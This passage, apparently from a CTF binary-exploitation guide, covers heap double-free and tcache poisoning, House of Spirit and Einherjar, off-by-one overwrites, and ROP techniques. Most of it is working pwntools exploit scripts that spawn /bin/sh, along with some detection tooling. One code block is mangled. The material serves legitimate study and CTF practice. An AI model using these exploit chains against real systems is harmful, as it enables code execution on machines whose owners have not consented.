free(chunk_A)  # Now chunk_A can be freed again
```

**Safe-Linking Bypass (glibc ≥2.32):**

```python
# Safe-linking mangles forward pointers:
# mangled_fd = (heap_addr >> 12) ^ actual_fd

# Bypass requires heap address leak
heap_leak = leak_heap()
heap_base = heap_leak & ~0xFFF

# Calculate mangled target address
target = elf.got['free']
mangled = ((heap_leak >> 12) ^ target)

# Use mangled value in double-free exploit
free(chunk)
free(chunk)
alloc(size, p64(mangled))  # Poison with mangled address
```

### Advanced Exploitation Patterns

**House of Spirit:**

```python
# Fake a chunk in stack/controllable memory, then free it

# 1. Craft fake chunk on stack with valid size field
fake_chunk = flat(
    p64(0),           # prev_size
    p64(0x71),        # size (must match fastbin/tcache size + flags)
    p64(0),           # fd (will be overwritten)
    p64(0),           # bk
    # ... user data area ...
    p64(0),           # prev_size of next chunk
    p64(0x20),        # size of next chunk (fake for validation)
)

# 2. Get fake_chunk address into program's chunk pointer
trigger_fake_chunk_ptr(fake_chunk_addr + 0x10)

# 3. Free fake chunk - enters fastbin/tcache
free_via_program(fake_chunk_addr + 0x10)

# 4. Subsequent allocation returns fake_chunk
# Can now control data program writes there
```

**Overlapping Chunks:**

```python
# Create two allocations that point to overlapping memory

# 1. Allocate chunks
chunk_A = alloc(0x88)
chunk_B = alloc(0x88)
chunk_C = alloc(0x88)

# 2. Free chunk_B
free(chunk_B)

# 3. Use overflow in chunk_A to modify chunk_B size
overflow_write(chunk_A, b'A' * 0x88 + p64(0x121))  # Fake larger size

# 4. Allocate large chunk that encompasses B and C
large_chunk = alloc(0x110)  # Returns chunk_B with modified size

# 5. Now large_chunk and chunk_C overlap
# Writing to large_chunk affects chunk_C data
```

**Fastbin Attack with __malloc_hook:**

```python
# Target __malloc_hook to hijack next malloc call

# 1. Leak libc to find __malloc_hook
libc_leak = leak_libc_address()
libc.address = libc_leak - offset
malloc_hook = libc.symbols['__malloc_hook']

# 2. Find gadget near __malloc_hook with valid size field
# Common: search backwards from __malloc_hook for 0x7f byte
target = malloc_hook - 0x23  # Example offset with size-like value

# 3. Double-free to poison fastbin
free(chunk_A)
free(chunk_B)
free(chunk_A)

# 4. Allocate and overwrite fd
alloc(size, p64(target))

# 5. Allocate to reach __malloc_hook region
alloc(size)
alloc(size)
alloc(size, b'A' * 0x13 + p64(one_gadget))  # Overwrite __malloc_hook

# 6. Next malloc triggers one_gadget
alloc(0x10)  # Calls one_gadget → shell
```

### Detection and Analysis Tools

**Heap Debugging with pwndbg:**

```bash
gdb ./vulnerable
pwndbg> set context-sections regs disasm code stack backtrace heap

# Visualize heap state
pwndbg> heap
pwndbg> bins
pwndbg> tcache
pwndbg> fastbins

# Find chunk metadata
pwndbg> find_fake_fast <address>

# Search for pointers to freed chunks
pwndbg> search -t qword <freed_address>
```

**Custom Double-Free Detector:**

```python
# GDB Python script to track frees
import gdb

freed_addresses = set()

class FreeBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super().__init__("free")
    
    def stop(self):
        frame = gdb.selected_frame()
        # x86-64: first arg in RDI
        addr = int(gdb.parse_and_eval("$rdi"))
        
        if addr in freed_addresses:
            print(f"[!] DOUBLE-FREE DETECTED: 0x{addr:x}")
            return True  # Stop execution
        
        freed_addresses.add(addr)
        return False  # Continue execution

FreeBreakpoint()
```

**Heap Tracing with ltrace:**

```bash
# Trace malloc/free calls
ltrace -e malloc -e free ./vulnerable

# Output shows:
malloc(100) = 0x556677880010
free(0x556677880010) = <void>
free(0x556677880010) = <void>  # Double-free visible
```

### Exploitation Workflow Example

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.binary = elf = ELF('./vulnerable')
context.log_level = 'debug'
libc = ELF('./libc.so.6')

p = process('./vulnerable')
# p = gdb.debug('./vulnerable', 'b free\nc')

# Helper functions
def alloc(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    if data:
        p.sendafter(b'data: ', data)
    p.recvuntil(b'idx: ')
    return int(p.recvline())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()

# Exploitation
info("Stage 1: Double-free to poison tcache")
victim = alloc(0x80, b'VICTIM')
free(victim)
free(victim)  # Double-free

info("Stage 2: Leak libc address")
leak_chunk = alloc(0x80)  # Get victim back
leak_data = show(leak_chunk)
libc_leak = u64(leak_data[:8])
libc.address = libc_leak - 0x1ebbe0  # Offset to libc base
success(f"Libc base: {hex(libc.address)}")

info("Stage 3: Overwrite tcache->next with __free_hook")
free_hook = libc.symbols['__free_hook']
alloc(0x80, p64(free_hook))

info("Stage 4: Allocate to __free_hook and write system")
alloc(0x80)  # Get intermediary chunk
alloc(0x80, p64(libc.symbols['system']))  # Write system to __free_hook

info("Stage 5: Free chunk with '/bin/sh' to trigger system")
sh_chunk = alloc(0x80, b'/bin/sh\x00')
free(sh_chunk)  # Calls system('/bin/sh')

p.interactive()
```

## Off-By-One Errors

### Fundamentals

Off-by-one (OBO) vulnerabilities occur when a loop, buffer operation, or boundary check is off by exactly one position, enabling single-byte overwrites beyond allocated boundaries. While seemingly minor, these can be leveraged for powerful exploitation.

**Common Patterns:**

```c
// Pattern 1: Loop boundary error
char buffer[10];
for (int i = 0; i <= 10; i++) {  // Should be i < 10
    buffer[i] = input[i];  // Writes 11 bytes (0-10)
}

// Pattern 2: Null terminator overflow
char dest[10];
strncpy(dest, source, sizeof(dest));  // No null terminator if source >= 10
dest[10] = '\0';  // Off-by-one overflow

// Pattern 3: Size calculation error
void copy(char *src, int len) {
    char buf[100];
    memcpy(buf, src, len + 1);  // Should be len or sizeof(buf)
}
```

**What Can Be Overwritten:**

- Null byte overflow: Overwrites single byte with `\x00`
- Heap metadata (size/flags fields)
- Saved frame pointer (SFP) least significant byte
- Stack canary least significant byte (always `\x00`)
- Length fields in adjacent structures

### Detection Techniques

**Static Analysis:**

```bash
# Search for common off-by-one patterns
grep -n "<=.*sizeof\|<=.*length\|<=.*size" source.c
grep -n "strncpy\|strncat" source.c  # Often misused

# Check loop boundaries
grep -A 2 "for.*;" source.c | grep "<="
```

**Dynamic Detection with ASan:**

```bash
# Compile with address sanitizer
gcc -fsanitize=address -fno-omit-frame-pointer -g -o target target.c

# Run - ASan detects heap/stack overflows
./target
# Output: heap-buffer-overflow on address 0x602000000019 at offset 0
```

**Valgrind Stack Overflow Detection:**

```bash
valgrind --tool=memcheck --track-origins=yes ./vulnerable
# Output: Invalid write of size 1
#   Address 0x... is 0 bytes after a block of size 100 alloc'd
```

**GDB Watchpoint:**

```bash
gdb ./vulnerable
# Break before vulnerable operation
gef> b vulnerable_function
gef> run

# Watch byte after buffer
gef> watch *(char*)($rbp-0x50)  # Adjust offset to target
gef> continue
# Breaks when off-by-one writes occur
```

### Heap Exploitation with Off-By-One

**Null Byte Overflow - Heap Consolidation:**

```python
#!/usr/bin/env python3
from pwn import *

# Scenario: Overwrite size field's LSB with null byte
# Enables overlap by shrinking next chunk's size

p = process('./vulnerable')

# Allocate chunks
chunk_A = alloc(0x88)  # Size 0x91 (including metadata)
chunk_B = alloc(0xF8)  # Size 0x101
chunk_C = alloc(0x88)  # Prevent top chunk consolidation

# Fill chunk_A (off-by-one overwrites chunk_B size LSB)
payload = b'A' * 0x88  # Fills chunk_A completely
# Off-by-one writes 0x00, changing chunk_B size from 0x101 → 0x100
edit(chunk_A, payload)

# Free chunk_B (allocator sees size as 0x100)
free(chunk_B)

# Allocate smaller chunk - returns chunk_B
chunk_D = alloc(0x88)  # Returns beginning of old chunk_B

# Allocate again - returns middle of old chunk_B
chunk_E = alloc(0x88)  # Overlaps with chunk_C!

# Now chunk_E and chunk_C point to overlapping memory
# Editing chunk_E affects chunk_C
```

**Overlapping Chunks via Metadata Corruption:**

```python
# Goal: Create two allocations pointing to same memory

# 1. Setup chunks
chunk_A = alloc(0x88)
chunk_B = alloc(0x88)
chunk_C = alloc(0x88)

# 2. Free chunk_B to get it into unsorted bin
free(chunk_B)

# 3. Off-by-one from chunk_A to corrupt chunk_B prev_size
payload = b'A' * 0x88 + p64(0x90)  # Fake prev_size
edit(chunk_A, payload)

# 4. Allocate into chunk_B, modify its size
chunk_D = alloc(0x88)  # Returns chunk_B
edit(chunk_D, p64(0) + p64(0x111))  # Extend size to cover chunk_C

# 5. Free chunk_D (now covers B and C)
free(chunk_D)

# 6. Allocate large chunk
chunk_E = alloc(0x100)  # Gets space covering chunk_B and chunk_C

# 7. chunk_E and chunk_C now overlap
```

**Extending Chunk Size:**

```python
# Technique: Overflow to increase adjacent chunk size

# Setup
chunk_A = alloc(0x18)  # Actual size 0x21
chunk_B = alloc(0x88)  # Actual size 0x91
chunk_C = alloc(0x88)  # Prevent consolidation

# Overflow from chunk_A to modify chunk_B size
overflow_data = b'A' * 0x18 + b'\x11'  # Change 0x91 to 0x11
# Actually, more useful: change to larger size
overflow_data = b'A' * 0x18 + p8(0xf1)  # 0x91 → 0xf1 (extend)
edit(chunk_A, overflow_data)

# Now chunk_B appears larger than actually allocated
# Freeing and reallocating enables overlap
```

### Stack Exploitation with Off-By-One

**Saved Frame Pointer (SFP) Overwrite:**

```c
// Stack layout (x86-64):
// [buffer][saved RBP][return address]
// Off-by-one overwrites saved RBP LSB

void vulnerable() {
    char buffer[256];
    read(0, buffer, 257);  // Off-by-one: reads 257 bytes
}
```

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Strategy: Overwrite RBP LSB to point RBP to controlled stack location
# On function return, caller's stack frame becomes attacker-controlled

# 1. Spray stack with ROP chain
rop_chain = flat(
    p64(pop_rdi),
    p64(bin_sh),
    p64(system)
)

# 2. Calculate target RBP value
# Want RBP to point into our buffer where ROP chain lives
target_rbp_lsb = 0x30  # Offset into buffer with ROP chain

# 3. Build payload
payload = flat(
    rop_chain,
    b'A' * (256 - len(rop_chain)),
    p8(target_rbp_lsb)  # Overwrite RBP LSB
)

p.send(payload)
# When vulnerable() returns, caller uses poisoned RBP
# Caller's leave instruction: mov rsp, rbp; pop rbp
# RSP now points to attacker data, subsequent ret uses ROP chain
```

**Partial Overwrite for ASLR Bypass:**

```python
# When ASLR randomizes addresses but low bytes remain constant

# Scenario: Return address is 0x00007fffffffe4b8
# Target win function at    0x00007fffffffe100
# Only need to modify lower 2 bytes: 0x04b8 → 0xe100

# Off-by-one can modify 1 byte at a time
payload = b'A' * offset + p8(0x00)  # Overwrite byte 0x4b8 → 0x400

# May need multiple attempts or information leak
# [Inference] Success probability depends on ASLR entropy and target proximity
```

### Advanced Techniques

**Heap Feng Shui for Reliable Exploitation:**

```python
# Carefully arrange heap to ensure off-by-one hits correct target

def heap_spray(size, count):
    """Fill holes in heap with predictable allocations"""
    chunks = []
    for _ in range(count):
        chunks.append(alloc(size))
    return chunks

def prepare_heap():
    # 1. Allocate and free to create predictable state
    for _ in range(7):  # Fill tcache
        c = alloc(0x88)
        free(c)
    
    # 2. Clear tcache with allocations
    filler = [alloc(0x88) for _ in range(7)]
    
    # 3. Setup target layout
    victim = alloc(0x88)
    target = alloc(0x88)
    guard = alloc(0x88)
    
    return victim, target, guard

# Now off-by-one from victim reliably affects target
victim, target, guard = prepare_heap()
```

**House of Einherjar:**

```python
# Combine off-by-one with fake chunk to achieve arbitrary allocation

# Requirements:
# - Off-by-one null byte overflow
# - Ability to set prev_size of overflowed chunk

# Setup
chunk_A = alloc(0xF8)   # size 0x101
chunk_B = alloc(0x88)   # size 0x91
chunk_C = alloc(0x88)   # Prevent consolidation

# Step 1: Create fake chunk in chunk_A
fake_chunk_offset = 0x80
fake_chunk = flat(
    p64(0),               # prev_size
    p64(0x91),            # size (fake, matches chunk_B)
    p64(0),               # fd
    p64(0),               # bk
)
edit(chunk_A, b'A' * fake_chunk_offset + fake_chunk)

# Step 2: Off-by-one to null terminate chunk_A size
# Changes chunk_B prev_size indicator
payload = b'A' * 0xF8 + b'\x00'  # Null byte overflow
edit(chunk_A, payload)  # chunk_B size: 0x101 → 0x100

# Step 3: Set chunk_B prev_size to point to fake chunk
fake_prev_size = (0x101 - fake_chunk_offset)
edit(chunk_A, fit({
    fake_chunk_offset: fake_chunk,
    0xF8: p64(fake_prev_size)  # Set prev_size in chunk_B
}))

# Step 4: Free chunk_B
# Allocator consolidates with "previous" (fake) chunk
free(chunk_B)

# Step 5: Allocate large chunk
# Returns chunk spanning fake_chunk location
large = alloc(0x140)

# Now large chunk overlaps chunk_A
# Can overwrite pointers, metadata, etc.
```

**Partial Canary Overwrite:**

```python
# Stack canaries end with null byte (0x00)
# Off-by-one that writes null byte doesn't change canary

# However, if off-by-one writes non-null, can modify canary
# Combined with format string to leak canary first

# 1. Leak canary
payload_leak = b'%13$p'  # Adjust offset
p.sendline(payload_leak)
canary = int(p.recvline().strip(), 16)

# 2. Off-by-one: overwrite canary LSB (always 0x00)
# Since it's already 0x00, this is no-op for protection
# But can be used to overwrite byte AFTER canary

# 3. Build full payload
payload = flat(
    b'A' * buf_size,
    p64(canary),
    b'X' * 7 + b'Y',  # Y overwrites LSB of saved RBP
)
```

### Tools and Exploitation Helpers

**Automatic Offset Finder:**

```python
def find_overflow_offset(binary_path):
    """Find exact offset where off-by-one occurs"""
    from pwn import *
    
    for offset in range(1, 1000):
        p = process(binary_path)
        payload = cyclic(offset) + b'\xFF'
        
        try:
            p.sendline(payload)
            p.wait(timeout=1)
            
            # Check core dump
            core = p.corefile
            if core:
                fault_addr = core.fault_addr
                pattern_offset = cyclic_find(fault_addr & 0xFFFFFFFF)
                return pattern_offset
        except:
            pass
        finally:
            p.close()
    
    return None
```

**Heap Chunk Validator:**

```python
def validate_chunk_size(size_field):
    """Check if size field is valid for exploitation"""
    size = size_field & ~0x7  # Remove flags
    
    # Check alignment
    if size % 0x10 != 0:
        return False, "Misaligned size"
    
    # Check reasonable bounds
    if size < 0x20 or size > 0x100000:
        return False, "Size out of reasonable range"
    
    return True, "Valid"

# Usage in GDB
gef> python validate_chunk_size(0x91)
```

**Off-By-One Detection Script:**

```python
# Compile with instrumentation to detect OBO writes
# trace_obo.py

import sys
from pwn import *

context.log_level = 'error'

def test_input(size):
    p = process(['./vulnerable'], stderr=PIPE)
    
    # Send input of varying sizes
    payload = b'A' * size
    p.send(payload)
    
    try:
        output = p.recvall(timeout=1)
        returncode = p.poll(block=True)
        
        if returncode < 0:  # Crashed
            return True, abs(returncode)
    except:
        pass
    finally:
        p.close()
    
    return False, 0

# Binary search for crash point
for size in range(1, 1024):
    crashed, signal = test_input(size)
    if crashed:
        print(f"[+] Crash at size {size}, signal {signal}")
        print(f"[+] Likely off-by-one at offset {size - 1}")
        break
```

## Return-Oriented Programming (ROP)

### Fundamentals

ROP is a code-reuse technique that chains together short instruction sequences ending in `ret` (gadgets) to execute arbitrary operations without injecting code. Essential when DEP/NX prevents shellcode execution.

**Gadget Structure:**

```assembly
pop rdi        ; Useful instruction(s)
ret            ; Return to next gadget

; Or multi-instruction gadgets:
pop rsi
pop rdx
ret
```

**Execution Flow:**

```
Stack layout with ROP chain:
+------------------+
| gadget_1_addr    | ← RSP initially points here
| value_for_pop    |
| gadget_2_addr    |
| value_for_pop    |
| gadget_3_addr    |
| system_addr      |
| "/bin/sh" addr   |
+------------------+

Each `ret` pops next address, transferring control
```

### Finding Gadgets

**ROPgadget:**

```bash
# Install
pip install ropgadget

# Basic search
ROPgadget --binary ./vulnerable

# Specific gadget search
ROPgadget --binary ./vulnerable --only "pop|ret"
ROPgadget --binary ./vulnerable --string "/bin/sh"
ROPgadget --binary ./vulnerable --opcode "5fc3"  # pop rdi; ret

# Filter by address (avoid null bytes)
ROPgadget --binary ./vulnerable --range 0x400000-0x500000

# Generate ROP chain automatically
ROPgadget --binary ./vulnerable --ropchain
```

**ropper:**

```bash
# Install
pip install ropper

# Interactive mode
ropper --file ./vulnerable

# Search specific gadgets
ropper --file ./vulnerable --search "pop rdi"
ropper --file ./vulnerable --search "mov [?], ?"  # Write primitive

# Chain generation
ropper --file ./vulnerable --chain "execve"

# Filter bad characters
ropper --file ./vulnerable --badbytes "000a0d"
```

**radare2:**

```bash
r2 -AA ./vulnerable
[0x00400000]> "/R pop rdi"  # Search ROP gadget
[0x00400000]> "/R/ pop rdx" # Regex search
[0x00400000]> pd 5 @ hit0_0  # Disassemble gadget
```

**pwntools ROP Module:**

```python
from pwn import *

elf = ELF('./vulnerable')
rop = ROP(elf)

# Search for gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# View available gadgets
print(rop.gadgets)

# Build chain
rop.raw(pop_rdi)
rop.raw(next(elf.search(b'/bin/sh')))
rop.raw(elf.plt['system'])

print(rop.dump())
payload = rop.chain()
```

### Basic ROP Chain Construction

**ret2libc - 64-bit:**

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')
p = process('./vulnerable')

# Find gadgets

rop = ROP(elf) pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Find /bin/sh string

binsh = next(elf.search(b'/bin/sh\x00')) # Or in libc after leak

# Build ROP chain

offset = 264 # Offset to return address

payload = flat( b'A' * offset, pop_rdi, binsh, elf.plt['system'] )

p.sendline(payload) p.interactive()

````

**ret2libc with ASLR - Information Leak Required:**
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vulnerable')

# Stage 1: Leak libc address
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])  # Return to main for second payload

payload1 = flat(
    b'A' * offset,
    rop.chain()
)

p.sendline(payload1)
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
success(f"Libc base: {hex(libc.address)}")

# Stage 2: Call system with leaked libc
rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

payload2 = flat(
    b'A' * offset,
    rop2.chain()
)

p.sendline(payload2)
p.interactive()
````

**32-bit ret2libc:**

```python
# 32-bit calling convention uses stack for arguments
# Stack layout: [func_addr][ret_addr][arg1][arg2][arg3]

payload = flat(
    b'A' * offset,
    p32(system_plt),
    p32(0xdeadbeef),  # Fake return address (unused)
    p32(binsh_addr)
)
```

### Advanced ROP Techniques

**Stack Pivoting:**

When buffer is too small for full ROP chain, pivot stack to controlled memory region:

```python
# Find stack pivot gadgets
ROPgadget --binary ./vulnerable --depth 5 | grep -E "xchg.*esp|mov.*esp|leave"

# Common gadgets:
# - leave; ret       (mov rsp, rbp; pop rbp; ret)
# - pop rsp; ret
# - xchg rax, rsp; ret

# Exploitation
bss_addr = elf.bss(0x800)  # Controlled writable memory

# Stage 1: Write ROP chain to BSS using write primitive
for i, qword in enumerate(rop_chain):
    write_primitive(bss_addr + i*8, qword)

# Stage 2: Pivot stack to BSS
pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
leave_ret = rop.find_gadget(['leave', 'ret'])[0]

payload = flat(
    b'A' * offset,
    pop_rbp,
    bss_addr,     # New RBP points to BSS
    leave_ret     # mov rsp, rbp; pop rbp; ret → stack now at BSS
)
```

**Ret2csu - Universal Gadget:**

Using `__libc_csu_init` gadgets present in most binaries for argument control:

```python
# Gadgets from __libc_csu_init:
# 
# 0x400880: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# (gadget1)
#
# 0x400866: mov rdx, r13; mov rsi, r14; mov edi, r15d;
#           call qword ptr [r12 + rbx*8]; add rbx, 1; cmp rbx, rbp;
#           jne 0x400866; add rsp, 8; pop rbx; pop rbp; ret
# (gadget2)

def ret2csu(func_ptr, rdi, rsi, rdx):
    """
    Call function pointer with three arguments using csu gadgets
    func_ptr: Pointer to function (in GOT, etc.)
    """
    gadget1 = 0x400880
    gadget2 = 0x400866
    
    chain = flat(
        gadget1,
        0,              # rbx = 0
        1,              # rbp = 1 (for rbx != rbp check)
        func_ptr,       # r12 = function pointer location
        rdx,            # r13 = rdx
        rsi,            # r14 = rsi
        rdi,            # r15 = rdi (edi)
        gadget2,
        0,              # add rsp, 8
        0, 0, 0, 0, 0, 0  # Padding for pops
    )
    return chain

# Usage: call read(0, bss, 100)
rop_chain = ret2csu(elf.got['read'], 0, bss_addr, 100)
```

**SROP (Sigreturn-Oriented Programming):**

Exploits `sigreturn` system call to set all registers:

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./vulnerable')
p = process('./vulnerable')

# Find syscall gadget and sigreturn
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
# or: syscall_ret = next(elf.search(asm('syscall; ret')))

# Setup sigreturn frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # execve syscall number
frame.rdi = bss_addr              # "/bin/sh" location
frame.rsi = 0                     # argv = NULL
frame.rdx = 0                     # envp = NULL
frame.rip = syscall_ret           # Execute syscall after sigreturn
frame.rsp = bss_addr + 0x200      # Set stack

# Build payload
payload = flat(
    b'A' * offset,
    pop_rax,
    constants.SYS_rt_sigreturn,   # rax = 15 (sigreturn)
    syscall_ret,                   # trigger sigreturn
    bytes(frame)                   # sigreturn frame
)

# First write "/bin/sh" to BSS
p.sendline(b'/bin/sh\x00')
p.sendline(payload)
p.interactive()
```

**JOP (Jump-Oriented Programming):**

Using `jmp` instead of `ret`:

```python
# Find JOP gadgets
ROPgadget --binary ./vulnerable | grep "jmp"

# Common pattern:
# jmp rax
# jmp [rax]
# jmp qword ptr [rax + offset]

# Chain using register control
payload = flat(
    pop_rax,
    gadget2_addr,
    jmp_rax,      # Jump to gadget2
    # ... continues with more JOP gadgets
)
```

**Ret2dlresolve:**

Force dynamic linker to resolve arbitrary function:

```python
# Complex technique - requires understanding of ELF dynamic linking
# Simplified concept:

from pwn import *

context.binary = elf = ELF('./vulnerable')

# Create fake link_map structures
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop = ROP(elf)
rop.raw(pop_rdi)
rop.raw(next(elf.search(b'/bin/sh')))
rop.ret2dlresolve(dlresolve)

payload = flat(
    b'A' * offset,
    rop.chain(),
    dlresolve.payload
)
```

### Protection Bypasses

**Stack Canary Bypass with ROP:**

```python
# Leak canary first, then construct ROP chain
payload_leak = b'A' * (offset_to_canary - 1)  # Stop before canary
p.send(payload_leak)

# Leak canary via output
canary = u64(p.recv(8))

# Build full exploit with correct canary
payload_exploit = flat(
    b'A' * (offset_to_canary - 8),
    canary,
    b'B' * 8,  # Saved RBP
    rop_chain
)
```

**ASLR + PIE Bypass:**

```python
# Stage 1: Leak PIE base
rop_leak = ROP(elf)
rop_leak.call('puts', [elf.got['puts']])  # Leak libc
rop_leak.call(elf.symbols['main'])        # Return to restart

payload1 = flat(b'A' * offset, rop_leak.chain())
p.sendline(payload1)

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']
success(f"Libc: {hex(libc.address)}")

# Stage 2: Use leaked addresses
rop_exec = ROP(libc)
rop_exec.execve(next(libc.search(b'/bin/sh')), 0, 0)

payload2 = flat(b'A' * offset, rop_exec.chain())
p.sendline(payload2)
```

**Pointer Guard Bypass:**

[Inference] Some systems protect function pointers with PTR_MANGLE/PTR_DEMANGLE.

```python
# PTR_MANGLE: encrypted = ((ptr >> 0x11) | (ptr << 0x2f)) ^ guard_value
# Requires leaking guard value or finding unprotected pointers

# Common bypass: use gadgets from .text section (not mangled)
# Or leak guard value via thread control structures
```

### One-Gadget ROP

**Finding One-Gadgets:**

```bash
# Install one_gadget tool
gem install one_gadget

# Find one-gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Output example:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

**Using One-Gadget:**

```python
# After leaking libc
libc.address = libc_leak - offset
one_gadget = libc.address + 0x4f3d5  # Adjust based on libc version

# Simplified ROP chain
payload = flat(
    b'A' * offset,
    one_gadget  # Single gadget gives shell if constraints met
)

# If constraints not met, adjust stack:
payload = flat(
    b'A' * offset,
    pop_rsp,
    aligned_stack_addr,  # Ensure alignment
    one_gadget
)
```

### Practical ROP Exploitation Workflow

```python
#!/usr/bin/env python3
from pwn import *

# ============ Configuration ============
context.binary = elf = ELF('./vulnerable')
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = process('./vulnerable')
p = remote('ctf.challenge.com', 1337)

# ============ Helper Functions ============
def send_overflow(payload):
    p.sendlineafter(b'input: ', payload)

def leak_address(got_entry):
    """Leak address from GOT"""
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [got_entry])
    rop.call(elf.symbols['main'])
    
    send_overflow(flat(b'A' * offset, rop.chain()))
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    return leak

# ============ Stage 1: Information Leak ============
info("Stage 1: Leaking libc address")
puts_leak = leak_address(elf.got['puts'])
libc.address = puts_leak - libc.symbols['puts']
success(f"Libc base: {hex(libc.address)}")
success(f"System: {hex(libc.symbols['system'])}")

# Verify leak looks reasonable
if libc.address & 0xfff != 0:
    warning("Libc base not page-aligned - leak may be incorrect")

# ============ Stage 2: Exploitation ============
info("Stage 2: Executing ROP chain")

# Build final ROP chain
rop = ROP(libc)
binsh = next(libc.search(b'/bin/sh'))

# Method 1: Standard system call
rop.call(libc.symbols['system'], [binsh])

# Method 2: execve syscall
# rop.execve(binsh, 0, 0)

# Method 3: One-gadget (if found)
# one_gadget = libc.address + 0x4f3d5
# rop.raw(one_gadget)

payload = flat(
    b'A' * offset,
    rop.chain()
)

send_overflow(payload)

# ============ Interaction ============
p.interactive()
```

### Debugging ROP Chains

**GDB ROP Chain Verification:**

```bash
gdb ./vulnerable
gef> pattern create 300
gef> run
# Input pattern
gef> pattern offset $rsp

# Set breakpoint before return
gef> b *vulnerable_func+123
gef> run
# Input ROP chain

# Step through gadgets
gef> si  # Step instruction
gef> telescope $rsp 20  # View stack

# Verify register values
gef> info registers
gef> x/20gx $rsp
```

**pwntools Debug Mode:**

```python
p = gdb.debug('./vulnerable', '''
    b *vulnerable_function+200
    c
''')

# Or attach to existing process
gdb.attach(p, '''
    b *0x400890
    c
''')
```

**ROP Chain Visualization:**

```python
# Print ROP chain before sending
rop = ROP(elf)
rop.call('system', [binsh])

print("=== ROP Chain ===")
print(rop.dump())
print("=================")

# Output shows:
# 0x0000:         0x400890 pop rdi; ret
# 0x0008:         0x601050 [arg0] binsh
# 0x0010:         0x400560 system
```

### Architecture-Specific Considerations

**x86 (32-bit) ROP:**

```python
# Arguments passed on stack
# Calling convention: [func_addr][ret_addr][arg1][arg2][arg3]

rop32 = flat(
    p32(system_addr),
    p32(exit_addr),   # Return address
    p32(binsh_addr)   # Argument
)

# For multiple calls:
pop_ret = 0x08048abc  # pop; ret gadget

rop32_chain = flat(
    p32(func1), p32(pop_ret), p32(arg1),
    p32(func2), p32(pop_ret), p32(arg2),
    p32(func3), p32(0xdeadbeef), p32(arg3)
)
```

**ARM ROP:**

```python
# Arguments in r0-r3, rest on stack
# Return via: bx lr or pop {pc}

context.arch = 'arm'

# Find gadgets
# Common: pop {r0, r1, r2, r3, pc}

rop_arm = flat(
    pop_r0_r1_r2_r3_pc,
    arg0,  # r0
    arg1,  # r1
    arg2,  # r2
    arg3,  # r3
    system_addr  # pc
)
```

**MIPS ROP:**

```python
# Arguments in $a0-$a3
# Return via: jr $ra

context.arch = 'mips'

# Challenging due to branch delay slots
# Gadget executes instruction after jr before jumping

rop_mips = flat(
    load_a0_gadget,
    binsh_addr,
    jalr_t9,  # Call function in $t9
    nop       # Branch delay slot
)
```

---

### Related Topics

**Important Subtopics:**

- **Heap Exploitation Primitives** - Overlaps with UAF, double-free for complete heap mastery
- **Format String Arbitrary Write** - Enables GOT overwrites often used with ROP
- **Shellcoding** - Alternative to ROP when DEP/NX is disabled
- **Kernel Exploitation** - ROP techniques apply to kernel-space exploitation

**Advanced Techniques:**

- **BROP (Blind ROP)** - ROP without binary access
- **ret2reg** - Return to register-controlled addresses
- **Data-Only Attacks** - Bypassing CFI without code-reuse

---

# Scripting & Automation

## Python Scripting for Binary Analysis

Python is the de facto standard for binary analysis and exploitation scripting in CTFs due to its extensive libraries, readable syntax, and rapid prototyping capabilities.

### Core Libraries for Binary Analysis

**struct module** - Binary data parsing and packing

```python
import struct

# Unpack 32-bit little-endian integer
data = b'\x41\x42\x43\x44'
value = struct.unpack('<I', data)[0]  # 0x44434241

# Pack 64-bit little-endian
packed = struct.pack('<Q', 0xdeadbeef)

# Common format characters:
# < = little-endian, > = big-endian
# B = unsigned char (1 byte)
# H = unsigned short (2 bytes)
# I = unsigned int (4 bytes)
# Q = unsigned long long (8 bytes)
```

**bytes and bytearray manipulation**

```python
# Reading binary files
with open('binary', 'rb') as f:
    data = f.read()

# Searching for patterns
offset = data.find(b'\x90\x90\x90\x90')

# XOR operations
def xor_bytes(data, key):
    return bytes([b ^ key for b in data])

# Multi-byte XOR
def multi_xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
```

**ELF parsing with pyelftools**

```bash
pip install pyelftools
```

```python
from elftools.elf.elffile import ELFFile
from elftools.elf.sections import SymbolTableSection

with open('binary', 'rb') as f:
    elf = ELFFile(f)
    
    # Get architecture
